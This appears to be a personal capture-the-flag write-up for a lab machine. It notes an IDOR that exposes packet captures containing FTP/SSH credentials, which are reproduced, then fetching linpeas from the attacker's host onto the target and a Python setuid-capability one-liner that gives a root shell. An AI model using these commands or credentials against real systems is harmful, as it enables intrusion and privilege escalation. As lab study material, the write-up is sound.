**IPv4: 10.10.10.245**
## Enumeration/Scanning
sudo nmap -sC -sV -O -v $IP

sudo nmap -A -Pn -sS -oN nmap $IP

ports
* 80
	* gunicorn webserver
* 22
* 21
	* vsftpd 3.0.3
	* Anonymous login not allowed

Insecure Direct Objet References (IDOR)
* application provides direct access to objects based on user-supplied input.
* This vuln allows attackers to bypass authorization and access resources in the system directly
* for example database records or files
* https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References#:~:text=Insecure%20Direct%20Object%20References%20

I am able to access pcap files from previous communication with the server by exploiting IDOR
* I was able to find ftp login creds
* username: nathan
* password: Buck3tH4TF0RM3!

I was able to login and retrieve the user flag.

creds also work for ssh login

now priv esc

Unable to access sudoers file
* sudo -l
* /etc/sudoers

I'm going to use linpeas to find a possible priv esc vuln

downloaded linpeas on my host
* wget https://github.com/carlospolop/PEASS-ng/releases/download/20230402/linpeas.sh

opened a http server
* python3 -m http.server 80

retrieved linpeas from my server
* wget http://10.10.147/linpeas.sh

ran linpeas on target
* chmod +x linpeas.sh
* ./linpeas.sh

Looks like there is a SUID exploit possible with python
* getcap -r / 2>/dev/null
* /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

looking at gtfo bins capabilities has a one liner that can give me a root shell
* https://gtfobins.github.io/gtfobins/python/
* python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

retrieved root flag

## Exploitation


## Privilege Escalation


## Post-exploitation
